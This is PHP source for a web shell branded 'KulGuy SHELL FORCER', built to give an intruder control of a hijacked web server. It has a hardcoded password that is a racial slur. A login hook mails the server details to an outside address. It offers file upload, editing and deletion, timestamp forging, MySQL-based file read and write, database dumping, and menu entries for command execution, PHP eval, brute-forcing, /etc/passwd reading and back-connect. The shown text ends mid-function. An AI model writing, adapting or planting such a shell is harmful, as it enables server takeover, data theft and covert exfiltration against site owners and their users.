<?php 

/****************************************\
|*		KulGuy SHELL FORCER				*|
|*		Edit & Develop by KG			*|
|*	==  Hacking & Security  ==			*|
\****************************************/

error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);

foreach(array('_GET','_POST') as $_request) {
    foreach($$_request as $_key => $_value) {
        if ($_key{0} != '_') {
            if (IS_GPC) {
                $_value = s_array($_value);
            }
            $$_key = $_value;
        }
    }
}

/*=================  Info Login  ================*/
$admin = array();
$admin['check'] = true;
$admin['pass']  = 'Nigga'; // Password login
$admin['cookiepre'] = '';
$admin['cookiedomain'] = '';
$admin['cookiepath'] = '/';
$admin['cookielife'] = 86400;
/*===================== End =====================*/

if ($charset == 'utf8') {
    header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
    header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
    header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
    header("content-Type: text/html; charset=iso-8859-2");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== Login =====================*/
if ($action == "logout") {
    scookie('vbapass', '', -86400 * 365);
    p('<body background=http://i.imgur.com/UIOvtY8.jpg?1>');
    exit;
}
if($admin['check']) {
    if ($doing == 'login') {
        if ($admin['pass'] == $password) {
            scookie('vbapass', $password);

// Function mail Sender to my Email - Please remove this before you using this shell code
$time_shell = "".date("d/m/Y - H:i:s")."";
$ip_remote = $_SERVER["REMOTE_ADDR"];
$from_shellcode = 'shell@'.gethostbyname($_SERVER['SERVER_NAME']).'';
$to_email = 'email@gmail.com';
$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST']."";
$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_shell";
$header = "From: $from_shellcode\r\nReply-to: $from_shellcode";
@mail($to_email, $server_mail, $linkcr, $header);
            p('<meta http-equiv="refresh" content="2;URL='.$self.'">');
            p('<body background=http://i.imgur.com/TzlPIq4.jpg?1>
<BR><BR><div align=center><font color=yellow face=tahoma size=2> Connecting to Sever - Please wait..<BR><img src=http://i.imgur.com/8GPXBt5.gif></div>');
            exit;
        }

    else
    {
    $err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Dont Try To Hack Mine Pass Idiot </blink><BR></font></div></td></tr></table>';
echo $err_mess;
    }}
    if ($_COOKIE['vbapass']) {
        if ($_COOKIE['vbapass'] != $admin['pass']) {
            loginpage();
        }
    } else {
        loginpage();
    }
}
/*===================== Login =====================*/

$errmsg = '';

if ($action == 'phpinfo') {
    if (IS_PHPINFO) {
        phpinfo();
    } else {
        $errmsg = 'phpinfo() function has non-permissible';
    }
}


if ($doing == 'downfile' && $thefile) {
    if (!@file_exists($thefile)) {
        $errmsg = 'The file you want Downloadable was nonexistent';
    } else {
        $fileinfo = pathinfo($thefile);
        header('Content-type: application/x-'.$fileinfo['extension']);
        header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
        header('Content-Length: '.filesize($thefile));
        @readfile($thefile);
        exit;
    }
}


if ($doing == 'backupmysql' && !$saveasfile) {
    dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
    $table = array_flip($table);
    $result = q("SHOW tables");
    if (!$result) p('<h2>'.mysql_error().'</h2>');
    $filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');
    header('Content-type: application/unknown');
    header('Content-Disposition: attachment; filename='.$filename);
    $mysqldata = '';
    while ($currow = mysql_fetch_array($result)) {
        if (isset($table[$currow[0]])) {
            $mysqldata .= sqldumptable($currow[0]);
        }
    }
    mysql_close();
    exit;
}

// Mysql
if($doing=='mysqldown'){
    if (!$dbname) {
        $errmsg = 'Please input dbname';
    } else {
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (!file_exists($mysqldlfile)) {
            $errmsg = 'The file you want Downloadable was nonexistent';
        } else {
            $result = q("select load_file('$mysqldlfile');");
            if(!$result){
                q("DROP TABLE IF EXISTS tmp_angel;");
                q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                //Download SQL
                q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                $result = q("select content from tmp_angel");
                q("DROP TABLE tmp_angel");
            }
            $row = @mysql_fetch_array($result);
            if (!$row) {
                $errmsg = 'Load file failed '.mysql_error();
            } else {
                $fileinfo = pathinfo($mysqldlfile);
                header('Content-type: application/x-'.$fileinfo['extension']);
                header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
                header("Accept-Length: ".strlen($row[0]));
                echo $row[0];
                exit;
            }
        }
    }
}

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?php echo str_replace('.','','Never Forget Who Helped You Till The End Of Your Life:)');?></title>
<style type="text/css">
body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}

a {color: #74A202;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
.head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
input, textarea, button
{
    font-size: 9pt;
    color: #ccc;
    font-family: verdana, sans-serif;
    background-color: #202020;
    border-left: 1px solid #74A202;
    border-top: 1px solid #74A202;
    border-right: 1px solid #74A202;
    border-bottom: 1px solid #74A202;
}
select
{
    font-size: 8pt;
    font-weight: normal;
    color: #ccc;
    font-family: verdana, sans-serif;
    background-color: #202020;
}

</style>
<script type="text/javascript">
function CheckAll(form) {
    for(var i=0;i<form.elements.length;i++) {
        var e = form.elements[i];
        if (e.name != 'chkall')
        e.checked = form.chkall.checked;
    }
}
function $(id) {
    return document.getElementById(id);
}
function goaction(act){
    $('goaction').action.value=act;
    $('goaction').submit();
}
</script>
</head>
<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=http://i.imgur.com/TzlPIq4.jpg?1>


<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
                <table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
                    <tr>
                        <td align="center" valign=center>
                 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
                   Loading<img src="http://i.imgur.com/8GPXBt5.gif">
                  </div>
                </td>
                    </tr>
                </table>
             </div>
 <script>
 var ld=(document.all);
  var ns4=document.layers;
 var ns6=document.getElementById&&!document.all;
 var ie4=document.all;
  if (ns4)
     ld=document.loading;
 else if (ns6)
     ld=document.getElementById("loading").style;
 else if (ie4)
     ld=document.all.loading.style;
  function init()
 {
 if(ns4){ld.visibility="hidden";}
 else if (ns6||ie4) ld.display="none";
 }
 </script>




<table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr class="head_small">
        <td  width=100%>
        <table width=100%><tr class="head_small"><td  width=86px><a title="Shell" href="<?php $self;?>"><img src=http://i.imgur.com/CMQdok0.jpg?1 height=150 border=0></a></td><td>
        <span style="float:right;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?>  | <a href="http://" target="_blank"><?php echo str_replace('.','','VIC');?> Shell</a> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span>

        <?php
        $curl_on = @function_exists('curl_version');
        $mysql_on = @function_exists('mysql_connect');
        $mssql_on = @function_exists('mssql_connect');
        $pg_on = @function_exists('pg_connect');
        $ora_on = @function_exists('ocilogon');

echo (($safe_mode)?("Safe_mod: <b><font color=green>ON</font></b> - "):("Safe_mod: <b><font color=red>OFF</font></b> - "));
echo "PHP version: <b>".@phpversion()."</b> - ";
        echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b> - "):("<b><font color=red>OFF</font></b> - "));
        echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b> - "; } else { echo "<font color=red>OFF</font></b> - "; }
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b><BR>";}

echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b><BR>";}else{echo "<font color=red>$df</font></b><BR>";}

echo "<font color=white>Uname -a</font>: ".@substr(@php_uname(),0,120)."<br>";
echo "<font color=white>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().")<br>";
        ?>
        </td></tr></table></td>
    </tr>
    <tr class="alt1">
        <td  width=100%><span style="float:right;">[Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> - Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>] </span>

            <a href="javascript:goaction('file');">File Manager</a> |
            <a href="javascript:goaction('sqladmin');">MySQL Manager</a> |
            <a href="javascript:goaction('sqlfile');">MySQL Upload &amp; Download</a> |
            <a href="javascript:goaction('shell');">Execute Command</a> |
            <a href="javascript:goaction('phpenv');">PHP Variable</a> |
            <a href="javascript:goaction('eval');">Eval PHP Code</a>
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('brute');">Brute</a> <?php }?>
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('etcpwd');">/etc/passwd</a> <?php }?>
            <?php if (!IS_WIN) {?> | <a href="javascript:goaction('backconnect');">Back Connect</a><?php }?>
			| <a href="qga.php">Get User</a>
        </td>
    </tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php

formhead(array('name'=>'goaction'));
makehide('action');
formfoot();

$errmsg && m($errmsg);

// Dir function
!$dir && $dir = '.';
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
    $dir = $dir.'/';
}
$uedir = ue($dir);

if (!$action || $action == 'file') {

    // Non-writeable
    $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';

    // Delete dir
    if ($doing == 'deldir' && $thefile) {
        if (!file_exists($thefile)) {
            m($thefile.' directory does not exist');
        } else {
            m('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));
        }
    }

    // Create new dir
    elseif ($newdirname) {
        $mkdirs = $nowpath.$newdirname;
        if (file_exists($mkdirs)) {
            m('Directory has already existed');
        } else {
            m('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));
            @chmod($mkdirs,0777);
        }
    }

    // Upload file
    elseif ($doupfile) {
        m('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));
    }

    // Edit file
    elseif ($editfilename && $filecontent) {
        $fp = @fopen($editfilename,'w');
        m('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));
        @fclose($fp);
    }

    // Modify
    elseif ($pfile && $newperm) {
        if (!file_exists($pfile)) {
            m('The original file does not exist');
        } else {
            $newperm = base_convert($newperm,8,10);
            m('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));
        }
    }

    // Rename
    elseif ($oldname && $newfilename) {
        $nname = $nowpath.$newfilename;
        if (file_exists($nname) || !file_exists($oldname)) {
            m($nname.' has already existed or original file does not exist');
        } else {
            m(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));
        }
    }

    // Copu
    elseif ($sname && $tofile) {
        if (file_exists($tofile) || !file_exists($sname)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            m(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));
        }
    }

    // File exit
    elseif ($curfile && $tarfile) {
        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            $time = @filemtime($tarfile);
            m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
        }
    }

    // Date
    elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
        if (!@file_exists($curfile)) {
            m(basename($curfile).' does not exist');
        } else {
            $time = strtotime("$year-$month-$day $hour:$minute:$second");
            m('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));
        }
    }

    // Download
    elseif($doing == 'downrar') {
        if ($dl) {
            $dfiles='';
            foreach ($dl as $filepath => $value) {
                $dfiles.=$filepath.',';
            }
            $dfiles=substr($dfiles,0,strlen($dfiles)-1);
            $dl=explode(',',$dfiles);
            $zip=new PHPZip($dl);
            $code=$zip->out;
            header('Content-type: application/octet-stream');
            header('Accept-Ranges: bytes');
            header('Accept-Length: '.strlen($code));
            header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');
            echo $code;
            exit;
        } else {
            m('Please select file(s)');
        }
    }

    // Delete file
    elseif($doing == 'delfiles') {
        if ($dl) {
            $dfiles='';
            $succ = $fail = 0;
            foreach ($dl as $filepath => $value) {
                if (@unlink($filepath)) {
                    $succ++;
                } else {
                    $fail++;
                }
            }
            m('Deleted file have finished??choose '.count($dl).' success '.$succ.' fail '.$fail);
        } else {
            m('Please select file(s)');
        }
    }

    // Function Newdir
    formhead(array('name'=>'createdir'));
    makehide('newdirname');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=>'fileperm'));
    makehide('newperm');
    makehide('pfile');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=>'copyfile'));
    makehide('sname');
    makehide('tofile');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=>'rename'));
    makehide('oldname');
    makehide('newfilename');
    makehide('dir',$nowpath);
    formfoot();
    formhead(array('name'=>'fileopform'));
    makehide('action');
    makehide('opfile');
    makehide('dir');
    formfoot();

    $free = @disk_free_space($nowpath);
    !$free && $free = 0;
    $all = @disk_total_space($nowpath);
    !$all && $all = 0;
    $used = $all-$free;
    $used_percent = @round(100/($all/$free),2);
    p('<font color=yellow face=tahoma size=2><B>File Manager</b> </font> Current disk free <font color=red>'.sizecount($free).'</font> of <font color=red>'.sizecount($all).'</font> (<font color=red>'.$used_percent.'</font>%)</font>');

?>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
    <td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php echo $nowpath;?>" type="text" style="width:100%;margin:0 8px;"></td>
    <td nowrap><input class="bt" value="GO" type="submit"></td>
  </tr>
  </form>
</table>
<script type="text/javascript">
function createdir(){
    var newdirname;
    newdirname = prompt('Please input the directory name:', '');
    if (!newdirname) return;
    $('createdir').newdirname.value=newdirname;
    $('createdir').submit();
}
function fileperm(pfile){
    var newperm;
    newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
    if (!newperm) return;
    $('fileperm').newperm.value=newperm;
    $('fileperm').pfile.value=pfile;
    $('fileperm').submit();
}
function copyfile(sname){
    var tofile;
    tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
    if (!tofile) return;
    $('copyfile').tofile.value=tofile;
    $('copyfile').sname.value=sname;
    $('copyfile').submit();
}
function rename(oldname){
    var newfilename;
    newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
    if (!newfilename) return;
    $('rename').newfilename.value=newfilename;
    $('rename').oldname.value=oldname;
    $('rename').submit();
}
function dofile(doing,thefile,m){
    if (m && !confirm(m)) {
        return;
    }
    $('filelist').doing.value=doing;
    if (thefile){
        $('filelist').thefile.value=thefile;
    }
    $('filelist').submit();
}
function createfile(nowpath){
    var filename;
    filename = prompt('Please input the file name:', '');
    if (!filename) return;
    opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
    $('fileopform').action.value=action;
    $('fileopform').opfile.value=opfile;
    $('fileopform').dir.value=dir;
    $('fileopform').submit();
}
function godir(dir,view_writable){
    if (view_writable) {
        $('godir').view_writable.value=1;
    }
    $('godir').dir.value=dir;
    $('godir').submit();
}
</script>
  <?php
    tbhead();
    p('<form action="'.$self.'" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
    p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="'.$dir.'" type="hidden" /><input name="dir" value="'.$dir.'" type="hidden" /></div>');
    p('<a href="javascript:godir(\''.$_SERVER["DOCUMENT_ROOT"].'\');">WebRoot</a>');
    if ($view_writable) {
        p(' | <a href="javascript:godir(\''.$nowpath.'\');">View All</a>');
    } else {
        p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">View Writable</a>');
    }
    p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Create File</a>');
    if (IS_WIN && IS_COM) {
        $obj = new COM('scripting.filesystemobject');
        if ($obj && is_object($obj)) {
            $DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');
            foreach($obj->Drives as $drive) {
                if ($drive->DriveType == 2) {
                    p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Size:'.sizecount($drive->TotalSize).'
Free:'.sizecount($drive->FreeSpace).'
Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
                } else {
                    p(' | <a href="javascript:godir(\''.$drive->Path.'/\');" title="Type:'.$DriveTypeDB[$drive->DriveType].'">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');
                }
            }
        }
    }

    p('</td></tr></form>');

    p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');

    // Get path
    $dirdata=array();
    $filedata=array();

    if ($view_writable) {
        $dirdata = GetList($nowpath);
    } else {
        // Open dir
        $dirs=@opendir($dir);
        while ($file=@readdir($dirs)) {
            $filepath=$nowpath.$file;
            if(@is_dir($filepath)){
                $dirdb['filename']=$file;
                $dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                $dirdb['dirchmod']=getChmod($filepath);
                $dirdb['dirperm']=getPerms($filepath);
                $dirdb['fileowner']=getUser($filepath);
                $dirdb['dirlink']=$nowpath;
                $dirdb['server_link']=$filepath;
                $dirdb['client_link']=ue($filepath);
                $dirdata[]=$dirdb;
            } else {
                $filedb['filename']=$file;
                $filedb['size']=sizecount(@filesize($filepath));
                $filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));
                $filedb['filechmod']=getChmod($filepath);
                $filedb['fileperm']=getPerms($filepath);
                $filedb['fileowner']=getUser($filepath);
                $filedb['dirlink']=$nowpath;
                $filedb['server_link']=$filepath;
                $filedb['client_link']=ue($filepath);
                $filedata[]=$filedb;
            }
        }// while
        unset($dirdb);
        unset($filedb);
        @closedir($dirs);
    }
    @sort($dirdata);
    @sort($filedata);
    $dir_i = '0';
    foreach($dirdata as $key => $dirdb){
        if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
            $thisbg = bg();
            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
            p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
            p('<td><a href="javascript:godir(\''.$dirdb['server_link'].'\');">'.$dirdb['filename'].'</a></td>');
            p('<td nowrap>'.$dirdb['mtime'].'</td>');
            p('<td nowrap>--</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirchmod'].'</a> / ');
            p('<a href="javascript:fileperm(\''.$dirdb['server_link'].'\');">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');
            p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete '.$dirdb['filename'].'? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Rename</a></td>');
            p('</tr>');
            $dir_i++;
        } else {
            if($dirdb['filename']=='..') {
                p('<tr class=fout>');
                p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\''.getUpPath($nowpath).'\');">Parent Directory</a></td>');
                p('</tr>');
            }
        }
    }

    p('<tr bgcolor="green" stlye="border-top:1px solid gray;border-bottom:1px solid gray;"><td colspan="6" height="5"></td></tr>');
    p('<form id="filelist" name="filelist" action="'.$self.'" method="post">');
    makehide('action','file');
    makehide('thefile');
    makehide('doing');
    makehide('dir',$nowpath);
    $file_i = '0';
    foreach($filedata as $key => $filedb){
        if($filedb['filename']!='..' && $filedb['filename']!='.') {
            $fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);
            $thisbg = bg();
            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
            p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl['.$filedb['server_link'].']"></td>');
            p('<td><a href="'.$fileurl.'" target="_blank">'.$filedb['filename'].'</a></td>');
            p('<td nowrap>'.$filedb['mtime'].'</td>');
            p('<td nowrap>'.$filedb['size'].'</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['filechmod'].'</a> / ');
            p('<a href="javascript:fileperm(\''.$filedb['server_link'].'\');">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');
            p('<td nowrap>');
            p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">Down</a> | ');
            p('<a href="javascript:copyfile(\''.$filedb['server_link'].'\');">Copy</a> | ');
            p('<a href="javascript:opfile(\'editfile\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Edit</a> | ');
            p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Rename</a> | ');
            p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Time</a>');
            p('</td></tr>');
            $file_i++;
        }
    }
    p('<tr class="fout1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Packing download selected</a> - <a href="javascript:dofile(\'delfiles\');">Delete selected</a></td><td colspan="4" align="right">'.$dir_i.' directories / '.$file_i.' files</td></tr>');
    p('</form></table>');
}// end dir

elseif ($action == 'sqlfile') {
    if($doing=="mysqlupload"){
        $file = $_FILES['uploadfile'];
        $filename = $file['tmp_name'];
        if (file_exists($savepath)) {
            m('The goal file has already existed');
        } else {
            if(!$filename) {
                m('Please choose a file');
            } else {
                $fp=@fopen($filename,'r');
                $contents=@fread($fp, filesize($filename));
                @fclose($fp);
                $contents = bin2hex($contents);
                if(!$upname) $upname = $file['name'];
                dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
                $result = q("SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';");
                m($result ? 'Upload success' : 'Upload has failed: '.mysql_error());
            }
        }
    }
?>
<script type="text/javascript">
function mysqlfile(doing){
    if(!doing) return;
    $('doing').value=doing;
    $('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
    $('mysqlfile').dbport.value=$('dbinfo').dbport.value;
    $('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
    $('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
    $('mysqlfile').dbname.value=$('dbinfo').dbname.value;
    $('mysqlfile').charset.value=$('dbinfo').charset.value;
    $('mysqlfile').submit();
}
</script>
<?php
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    $charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');
    formhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));
    makehide('action','sqlfile');
    p('<p>');
    p('DBHost:');
    makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));
    p(':');
    makeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));
    p('DBUser:');
    makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));
    p('DBPass:');
    makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));
    p('DBName:');
    makeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));
    p('DBCharset:');
    makeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));
    p('</p>');
    formfoot();
    p('<form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile">');
    p('<h2>Upload file</h2>');
    p('<p><b>This operation the DB user must has FILE privilege</b></p>');
    p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
    p('<h2>Download file</h2>');
    p('<p>File: <input class="input" name="mysqldlfile" size="115" type="text" /> <a href="javascript:mysqlfile(\'mysqldown\');">Download</a></p>');
    makehide('dbhost');
    makehide('dbport');
    makehide('dbuser');
    makehide('dbpass');
    makehide('dbname');
    makehide('charset');
    makehide('doing');
    makehide('action','sqlfile');
    p('</form>');
}

elseif ($action == 'sqladmin') {
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
    if(isset($dbhost)){
        $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
    }
    if(isset($dbuser)) {
        $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
    }
    if(isset($dbpass)) {
        $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
    }
    if(isset($dbport)) {
        $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
    }
    if(isset($dbname)) {
        $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
    }
    if(isset($charset)) {
        $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
    }

    if ($doing == 'backupmysql' && $saveasfile) {
        if (!$table) {
            m('Please choose the table');
        } else {
            dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
            $table = array_flip($table);
            $fp = @fopen($path,'w');
            if ($fp) {
                $result = q('SHOW tables');
                if (!$result) p('<h2>'.mysql_error().'</h2>');
                $mysqldata = '';
                while ($currow = mysql_fetch_array($result)) {
                    if (isset($table[$currow[0]])) {
                        sqldumptable($currow[0], $fp);
                    }
                }
                fclose($fp);
                $fileurl = str_replace(SA_ROOT,'',$path);
                m('Database has success backup to <a href="'.$fileurl.'" target="_blank">'.$path.'</a>');
                mysql_close();
            } else {
                m('Backup failed');
            }
        }
    }
    if ($insert && $insertsql) {
        $keystr = $valstr = $tmp = '';
        foreach($insertsql as $key => $val) {
            if ($val) {
                $keystr .= $tmp.$key;
                $valstr .= $tmp."'".addslashes($val)."'";
                $tmp = ',';
            }
        }
        if ($keystr && $valstr) {
            dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
